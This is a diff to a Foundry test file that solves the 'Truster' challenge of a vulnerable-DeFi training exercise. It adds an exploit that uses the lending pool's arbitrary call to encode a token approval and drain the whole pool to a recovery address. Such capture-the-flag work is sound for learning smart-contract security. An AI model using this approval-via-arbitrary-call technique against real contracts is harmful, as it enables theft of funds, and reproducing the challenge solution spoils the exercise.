@@ -5,16 +5,18 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
+import {Execute} from "../../src/truster/Execute.sol";
 
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
     address recovery = makeAddr("recovery");
-    
+
     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
 
     DamnValuableToken public token;
     TrusterLenderPool public pool;
+    Execute public execute;
 
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
@@ -51,7 +53,14 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        execute = new Execute();
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(execute),
+            TOKENS_IN_POOL
+        );
+
+        execute.execute(pool, token, recovery, TOKENS_IN_POOL, data);
     }
 
     /**
@@ -63,6 +72,10 @@ contract TrusterChallenge is Test {
 
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
     }
 }
